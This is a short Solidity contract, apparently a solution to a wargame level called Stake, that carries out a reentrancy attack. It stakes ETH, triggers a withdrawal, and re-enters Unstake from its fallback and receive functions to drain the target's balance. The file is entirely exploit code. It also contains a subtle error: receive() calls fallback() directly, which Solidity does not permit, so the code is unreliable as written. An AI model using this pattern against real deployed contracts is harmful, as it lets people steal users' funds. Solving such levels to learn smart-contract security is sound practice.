pragma solidity ^0.8.0;
import "../levels/Stake.sol";

contract ReentrancyAttack {
    Stake public stake;
    uint public amountToWithdraw = 1 ether; // Adjust based on the target requirement

    constructor (address _stake) {
        stake = Stake(_stake);
    }

    // Starts the attack by staking ETH and triggering the reentrancy
    function attack() external payable {
        // Stake ETH (requires msg.value > 0.001 ether)
        stake.StakeETH{value: msg.value}();

        // Initiate first withdrawal
        stake.Unstake(amountToWithdraw);
    }

    // Fallback triggered during withdrawal
    fallback() external payable {
        // Recursively withdraw until balance is zero or we are out of amount
        if (address(stake).balance >= amountToWithdraw) {
            stake.Unstake(amountToWithdraw);
        }
    }

    // Receive ETH, fallback into withdrawal
    receive() external payable {
        fallback();
    }
}